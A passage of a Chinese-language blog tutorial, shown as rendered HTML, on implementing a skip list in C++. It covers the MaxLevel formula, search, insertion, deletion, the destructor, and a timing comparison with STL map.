class="hljs-keyword">this</span>-&gt;element=theElement;<br>        <span class="hljs-keyword">this</span>-&gt;next=<span class="hljs-keyword">new</span> skipNode&lt;KeyType,ValueType&gt;*[size];<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
<h4 id="确定maxlevel"><a class="markdownIt-Anchor" href="#确定maxlevel"></a> 确定MaxLevel</h4>
<p>MaxLevel太大，造成空间的浪费，太小又会导致退化成一个冗杂的 ‘单链表’ 结构，两者均会影响跳跃表的性能。因此合适的MaxLevel十分重要。</p>
<p>从《Skip Lists: A Probabilistic Alternative to<br />
Balanced Trees》 中我们可以这样定义一个MaxLevel，即<br />
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mfrac><mn>1</mn><mi>p</mi></mfrac></msub><mi>n</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">L(n)=\lceil log_\frac{1}{p}n \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3342399999999999em;vertical-align:-0.5842399999999999em;"></span><span class="mopen">⌈</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.75378em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443142857142858em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.48288571428571425em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5842399999999999em;"><span></span></span></span></span></span></span><span class="mord mathdefault">n</span><span class="mclose">⌉</span></span></span></span><br />
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mi>a</mi><mi>x</mi><mi>L</mi><mi>e</mi><mi>v</mi><mi>e</mi><mi>l</mi><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">MaxLevel=L(N),N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord mathdefault">L</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span>为待插入元素节点总数</p>
<p>利用换底公式 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo><mi>log</mi><mo>⁡</mo></mo><mi>a</mi></msub><mi>b</mi><mo>=</mo><mfrac><mrow><msub><mo><mi>log</mi><mo>⁡</mo></mo><mi>c</mi></msub><mi>b</mi></mrow><mrow><msub><mo><mi>log</mi><mo>⁡</mo></mo><mi>c</mi></msub><mi>a</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\log_ab=\frac{\log_cb}{\log_ca}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.057252em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.513324em;vertical-align:-0.5311079999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.982216em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop mtight">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.04167428571428572em;"><span style="top:-2.2341314285714287em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26586857142857145em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mathdefault mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.496108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight"><span class="mop mtight">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.04167428571428572em;"><span style="top:-2.2341314285714287em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26586857142857145em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mathdefault mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5311079999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 转化为C++代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MaxLevel</span><span class="hljs-params">(<span class="hljs-keyword">int</span> numberOfnode,<span class="hljs-keyword">float</span> prob)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(<span class="hljs-built_in">ceil</span>(<span class="hljs-built_in">logf</span>((<span class="hljs-keyword">float</span>)numberOfnode)/<span class="hljs-built_in">logf</span>((<span class="hljs-keyword">float</span>)<span class="hljs-number">1</span>/prob)));<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="skiplist初始化"><a class="markdownIt-Anchor" href="#skiplist初始化"></a> skiplist初始化</h4>
<p>我们只需在构造函数进行初始化即可。<br />
这里我们既可以自定义跳跃表的<code>MaxLevel</code>，也可以通过<code>numberOfnode</code>来计算一个<code>MaxLevel</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br>skiplist&lt;KeyType,ValueType&gt;::<span class="hljs-built_in">skiplist</span>(<span class="hljs-keyword">float</span> prob,KeyType tailLargeKey,<span class="hljs-keyword">int</span> max_level,<span class="hljs-keyword">int</span> numberOfnode) &#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">nullptr</span>));<br>    m_prob=prob;<br>    m_size=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 计算最大链表层数</span><br>    <span class="hljs-keyword">if</span>(numberOfnode!=<span class="hljs-number">-1</span>)<br>        m_maxLevel=<span class="hljs-built_in">MaxLevel</span>(numberOfnode,prob);<br>    <span class="hljs-keyword">else</span><br>        m_maxLevel=max_level;<br>        <br>    m_curMaxLevel=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 初始化尾节点</span><br>    m_tailKey=tailLargeKey;<br>    Element&lt;KeyType,ValueType&gt;tailPair&#123;m_tailKey,<span class="hljs-number">0</span>&#125;;<br>    m_tailNode=<span class="hljs-keyword">new</span> skipNode&lt;KeyType,ValueType&gt;(tailPair,<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 初始化头结点</span><br>    m_headNode=<span class="hljs-keyword">new</span> skipNode&lt;KeyType,ValueType&gt;(tailPair,m_maxLevel);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m_maxLevel; i++)&#123;<br>        m_headNode-&gt;next[i]=m_tailNode;<br>    &#125;<br>    m_forwardNodes=<span class="hljs-keyword">new</span> skipNode&lt;KeyType,ValueType&gt;*[m_maxLevel];<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>尾节点内存分配类似<code>malloc(0)</code>形式</p>
<h4 id="skiplist查找-find和search"><a class="markdownIt-Anchor" href="#skiplist查找-find和search"></a> skiplist查找 find和search</h4>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br>skipNode&lt;KeyType,ValueType&gt;* skiplist&lt;KeyType,ValueType&gt;::<span class="hljs-built_in">search</span>(<span class="hljs-keyword">const</span> KeyType&amp;key)&#123;<br>    skipNode&lt;KeyType,ValueType&gt;*forwardNode=m_headNode;<br>    <span class="hljs-comment">// 外层循环: 不断的指向下一层级链表</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = m_curMaxLevel<span class="hljs-number">-1</span>; i &gt;= <span class="hljs-number">0</span>; --i)&#123;<br>        <span class="hljs-comment">// 内层循环: 指向当前层级链表的邻接节点</span><br>        <span class="hljs-keyword">while</span> (forwardNode-&gt;next[i]!=m_tailNode&amp;&amp;forwardNode-&gt;next[i]-&gt;element.key&lt;key)&#123;<br>            forwardNode=forwardNode-&gt;next[i];<br>        &#125;<br>        <span class="hljs-comment">// 保存前驱节点指针</span><br>        <span class="hljs-keyword">this</span>-&gt;m_forwardNodes[i]=forwardNode;<br>    &#125;<br>    <span class="hljs-keyword">return</span> forwardNode-&gt;next[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br>Element&lt;KeyType,ValueType&gt;* skiplist&lt;KeyType,ValueType&gt;::<span class="hljs-built_in">find</span>(<span class="hljs-keyword">const</span> KeyType&amp;key)&#123;<br>    <span class="hljs-keyword">if</span>(key &gt; <span class="hljs-keyword">this</span>-&gt;m_tailKey)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    skipNode&lt;KeyType,ValueType&gt;*forwardNode=m_headNode;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = m_curMaxLevel<span class="hljs-number">-1</span>; i &gt;=<span class="hljs-number">0</span> ; --i)&#123;<br>        <span class="hljs-keyword">while</span> (forwardNode-&gt;next[i]!=m_tailNode &amp;&amp; forwardNode-&gt;next[i]-&gt;element.key &lt; key)&#123;<br>            forwardNode=forwardNode-&gt;next[i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 最终会遍历到第0层-&gt;原始层，只需要在第0层判断即可</span><br>    <span class="hljs-keyword">if</span>(forwardNode-&gt;next[<span class="hljs-number">0</span>]-&gt;element.key==key)&#123;<br>        <span class="hljs-keyword">return</span> &amp;forwardNode-&gt;next[<span class="hljs-number">0</span>]-&gt;element;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>其中<code>find</code>和<code>search</code>都是从当前最大层级依次向下遍历，不同的是，<code>search</code>在遍历的同时将每次遍历到每一层的<code>前驱节点</code>保存在<code>m_forwardNodes</code>中，目的是为了衔接后面的插入/删除节点</p>
<p><img src="/uploads/images/data_structure/skiplist_cpp/04.png" alt="" /></p>
<p>其中的 <code>forwardNode-&gt;next[0]</code> 就是下一个要查找的节点(如果存在的话)</p>
<h4 id="skiplist插入"><a class="markdownIt-Anchor" href="#skiplist插入"></a> skiplist插入</h4>
<p>每一次插入，需要通过<code>search</code>保存 <code>前驱节点m_forwardNodes</code> 从而将待插入节点连接起来。如下图红色箭头表示前后需要链接的节点。<br />
需要注意的是，跳跃表是<code>有序链表</code>，下图只是为了解释而已 (其实是当时不小心画错了… 😦)<br />
<img src="/uploads/images/data_structure/skiplist_cpp/05.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br><span class="hljs-keyword">void</span> skiplist&lt;KeyType,ValueType&gt;::<span class="hljs-built_in">insert</span>(<span class="hljs-keyword">const</span> Element&lt;KeyType,ValueType&gt;&amp;element)&#123;<br>    <span class="hljs-comment">// 随机生成索引节点层数 1&lt;=level&lt;=m_maxLevel</span><br>    <span class="hljs-keyword">int</span> level=<span class="hljs-built_in">random_level</span>();<br>    <span class="hljs-keyword">if</span>(level &gt; <span class="hljs-keyword">this</span>-&gt;m_curMaxLevel)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;m_curMaxLevel=level;<br>    &#125;<br>    skipNode&lt;KeyType,ValueType&gt;*pNode=<span class="hljs-built_in">search</span>(element.key);<br>    <span class="hljs-comment">// 已经存在</span><br>    <span class="hljs-keyword">if</span>(pNode-&gt;element.key==element.key)&#123;<br>        pNode-&gt;element.value=element.value;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 此时已经保存了合适的前驱节点m_forwardNodes</span><br>    <span class="hljs-comment">// 创建一个具有level层的节点</span><br>    skipNode&lt;KeyType,ValueType&gt;*pNewNode = <span class="hljs-keyword">new</span> skipNode&lt;KeyType,ValueType&gt;(element,level);<br>    <br>    <span class="hljs-comment">// 建立索引节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = level<span class="hljs-number">-1</span>; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        pNewNode-&gt;next[i]=m_forwardNodes[i]-&gt;next[i];<br>        m_forwardNodes[i]-&gt;next[i]=pNewNode;<br>    &#125;<br>    m_size++;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="skiplist删除"><a class="markdownIt-Anchor" href="#skiplist删除"></a> skiplist删除</h4>
<p>删除操作类似插入操作，也需要通过<code>search</code>保存 <code>前驱节点m_forwardNodes</code><br />
<img src="/uploads/images/data_structure/skiplist_cpp/06.png" alt="" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br><span class="hljs-keyword">bool</span> skiplist&lt;KeyType,ValueType&gt;::<span class="hljs-built_in">erase</span>(<span class="hljs-keyword">const</span> KeyType&amp;key)&#123;<br>    <span class="hljs-comment">// 不符合的key</span><br>    <span class="hljs-keyword">if</span>(key&gt;m_tailKey)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    skipNode&lt;KeyType,ValueType&gt;*pNode=<span class="hljs-built_in">search</span>(key);<br>    <span class="hljs-comment">// 不存在 </span><br>    <span class="hljs-keyword">if</span>(pNode-&gt;element.key!=key)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">// 更新跳表链表结构</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = m_curMaxLevel<span class="hljs-number">-1</span>; i &gt;= <span class="hljs-number">0</span>; --i)&#123;<br>        <span class="hljs-comment">// 此处 m_forwardNodes[i]-&gt;next[i] 可能不是 pNode</span><br>        <span class="hljs-keyword">if</span>(m_forwardNodes[i]-&gt;next[i]==pNode)<br>            m_forwardNodes[i]-&gt;next[i]=pNode-&gt;next[i];<br>    &#125;<br>    <br>    <span class="hljs-comment">// 维护当前最大层级数</span><br>    <span class="hljs-comment">// 当删除一个具有最大层级的节点时，可能会导致 m_headNode-&gt;next[m_maxLevel-1]=m_tailNode，那么此时需要降低层级</span><br>    <span class="hljs-keyword">while</span> (m_curMaxLevel<span class="hljs-number">-1</span> &gt; <span class="hljs-number">0</span>&amp;&amp;m_headNode-&gt;next[m_curMaxLevel<span class="hljs-number">-1</span>]==m_tailNode)&#123;<br>        m_curMaxLevel--;<br>    &#125;<br>    <span class="hljs-keyword">delete</span> pNode;   <br>    m_size--;    <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>需要注意的是，删除节点后还要维护<code>m_curMaxLevel</code>使其不能太高，这样的话可以减少遍历次数。<br />
<img src="/uploads/images/data_structure/skiplist_cpp/07.png" alt="" /></p>
<h4 id="释放跳跃表"><a class="markdownIt-Anchor" href="#释放跳跃表"></a> 释放跳跃表</h4>
<p>在析构函数中释放所有内存</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br>skiplist&lt;KeyType,ValueType&gt;::~<span class="hljs-built_in">skiplist</span>()&#123;<br>    <span class="hljs-keyword">while</span> (m_headNode!=m_tailNode)&#123;<br>        <span class="hljs-keyword">auto</span> x=m_headNode-&gt;next[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">delete</span> m_headNode;<br>        m_headNode=x;<br>    &#125;<br>    <span class="hljs-keyword">delete</span> m_tailNode;<br>    <span class="hljs-keyword">delete</span> []m_forwardNodes;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h3>
<p>用skiplist和STL map测试插入操作，仅供参考</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;skiplist.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ClockTest.h&quot;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 一个无穷数</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TAIL_INFINITY_KEY 0xffffff</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> n=<span class="hljs-number">1000000</span>;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">nullptr</span>));<br>    <span class="hljs-comment">// 测试skiplist insert</span><br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    <span class="hljs-function">skiplist&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">sk</span><span class="hljs-params">(<span class="hljs-number">0.5</span>,TAIL_INFINITY_KEY,<span class="hljs-number">0</span>,n)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;= <span class="hljs-number">0</span>; --i)&#123;<br>        sk.<span class="hljs-built_in">insert</span>(Element&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt;&#123;<span class="hljs-built_in">rand</span>()%n,i&#125;);<br>    &#125;<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> skiplist_insert_time=CClock::<span class="hljs-built_in">time_duration</span>();<br>    <br>    <span class="hljs-comment">// 测试map insert</span><br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    map&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; mp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        mp.<span class="hljs-built_in">insert</span>(pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt;(<span class="hljs-built_in">rand</span>()%n,i));<br>    &#125;<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> map_insert_time=CClock::<span class="hljs-built_in">time_duration</span>();<br>    <br>    <span class="hljs-comment">// 测试skiplist find</span><br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        sk.<span class="hljs-built_in">find</span>(<span class="hljs-built_in">rand</span>()%n);<br>    &#125;<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> skip_find_time=CClock::<span class="hljs-built_in">time_duration</span>();<br><br>    <span class="hljs-comment">// 测试map find</span><br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        mp.<span class="hljs-built_in">find</span>(<span class="hljs-built_in">rand</span>()%n);<br>    &#125;<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> map_find_time=CClock::<span class="hljs-built_in">time_duration</span>();<br>    <br>    <span class="hljs-comment">// 测试skiplist erase</span><br>    CClock::<span class="hljs-built_in">start_timeclock</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = n; i &gt;=<span class="hljs-number">0</span>; --i)&#123;<br>        sk.<span class="hljs-built_in">erase</span>(<span class="hljs-built_in">rand</span>()%n);<br>    &#125;<br>    CClock::<span class="hljs-built_in">stop_timeclock</span>();<br>    <span class="hljs-keyword">auto</span> 